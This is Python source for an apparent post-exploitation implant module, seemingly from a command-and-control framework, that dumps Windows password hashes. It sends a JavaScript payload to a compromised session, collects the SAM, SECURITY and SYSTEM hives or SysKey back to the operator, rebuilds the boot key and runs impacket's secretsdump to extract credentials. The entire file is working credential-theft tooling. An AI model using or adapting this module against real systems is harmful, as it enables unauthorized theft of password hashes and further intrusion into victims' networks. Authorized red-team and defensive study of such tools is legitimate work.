import core.implant

class HashDumpSAMImplant(core.implant.Implant):

    NAME = "SAM Hash Dump"
    DESCRIPTION = "Dumps the SAM hive off the target system."
    AUTHORS = ["zerosum0x0"]

    def load(self):
        self.options.register("LPATH", "/tmp/", "local file save path")
        self.options.register("RPATH", "%TEMP%", "remote file save path")
        self.options.register("GETSYSHIVE", "false", "Retrieve the system hive? (slower, but more reliable)",enum=["true", "false"])

    def job(self):
        return HashDumpSAMJob

    def run(self):

        import os.path
        if not os.path.isfile("data/impacket/examples/secretsdump.py"):
            old_prompt = self.shell.prompt
            old_clean_prompt = self.shell.clean_prompt
            self.shell.prompt = "Would you like me to get it for you? y/N: "
            self.shell.clean_prompt = self.shell.prompt

            self.shell.print_warning("It doesn't look like you have the impacket submodule installed yet! This module will fail if you don't have it!")
            try:
                import readline
                readline.set_completer(None)
                option = self.shell.get_command(self.shell.prompt)
                if option.lower() == "y":
                    from subprocess import call
                    call(["git", "submodule", "init"])
                    call(["git", "submodule", "update"])
            except KeyboardInterrupt:
                self.shell.print_plain(self.shell.clean_prompt)
                return
            finally:
                self.shell.prompt = old_prompt
                self.shell.clean_prompt = old_clean_prompt

        self.options.set("RPATH", self.options.get('RPATH').replace("\\", "\\\\").replace('"', '\\"'))

        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/gather/hashdump_sam.js", self.options)

        self.dispatch(payloads, self.job)

class HashDumpSAMJob(core.job.Job):

    def create(self):
        if self.session_id == -1:
            return
        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
            self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
            return False

    def save_file(self, data, name, encoder):
        import uuid
        save_fname = self.options.get("LPATH") + "/" + name + "." + self.ip + "." + uuid.uuid4().hex
        save_fname = save_fname.replace("//", "/")

        with open(save_fname, "wb") as f:
            data = self.decode_downloaded_data(data, encoder)
            f.write(data)

        return save_fname

    def report(self, handler, data, sanitize = False):
        task = handler.get_header("Task", False)

        if task == "SAM":
            handler.reply(200)
            self.print_status("received SAM hive (%d bytes)" % len(data))
            self.sam_data = data
            self.sam_encoder = handler.get_header("encoder", 1252)
            return

        if task == "SYSTEM":
            handler.reply(200)

            self.print_status("received SYSTEM hive (%d bytes)" % len(data))
            self.system_data = data
            self.system_encoder = handler.get_header("encoder", 1252)
            return

        if task == "SysKey":
            handler.reply(200)

            self.print_status("received SysKey (%d bytes)" % len(data))
            self.syskey_data = data
            self.system_data = ""
            self.syskey_encoder = handler.get_header("encoder", 1252)
            return

        if task == "SECURITY":
            handler.reply(200)

            self.print_status("received SECURITY hive (%d bytes)" % len(data))
            self.security_data = data
            self.security_encoder = handler.get_header("encoder", 1252)
            return

        # dump sam here

        import threading
        self.finished = False
        threading.Thread(target=self.finish_up).start()
        handler.reply(200)

    def finish_up(self):

        from subprocess import Popen, PIPE, STDOUT
        path = "data/impacket/examples/secretsdump.py"

        self.sam_file = self.save_file(self.sam_data, "SAM", self.sam_encoder)
        self.print_status("decoded SAM hive (%s)" % self.sam_file)

        self.security_file = self.save_file(self.security_data, "SECURITY", self.security_encoder)
        self.print_status("decoded SECURITY hive (%s)" % self.security_file)

        if self.system_data:
            self.system_file = self.save_file(self.system_data, "SYSTEM", self.system_encoder)
            self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
            cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
        else:
            self.syskey_data_file = self.save_file(self.syskey_data, "SYSKEY", self.syskey_encoder)

            tmp_syskey = ""
            self.syskey = ""
            with open(self.syskey_data_file, 'rb') as syskeyfile:
                file_contents = syskeyfile.read()

            i = 4220
            while i < 28811:
                j = i + 15
                while i < j:
                    tmp_syskey += file_contents[i:i+1].decode()
                    i += 2
                i += 8176

            tmp_syskey = list(map(''.join, zip(*[iter(tmp_syskey)]*2)))

            transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
            for i in transforms:
                self.syskey += tmp_syskey[i]

            try:
                self.syskey.decode()
            except:
                self.error("0", "There was a problem decoding the syskey. Try setting GETSYSHIVE to true and running again.", "Decode error", "")
                return False

            self.print_status("decoded SysKey: 0x%s" % self.syskey)
            cmd = ['python2', path, '-sam', self.sam_file, '-bootkey', self.syskey, '-security', self.security_file, 'LOCAL']

        p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True, env={"PYTHONPATH": "./data/impacket"})
        output = p.stdout.read().decode()
        self.shell.print_plain(output)
        self.results = output

        cp = core.cred_parser.CredParse(self)
        cp.parse_hashdump_sam(output)

        super(HashDumpSAMJob, self).report(None, "", False)

    def done(self):
        pass

    def display(self):
        pass
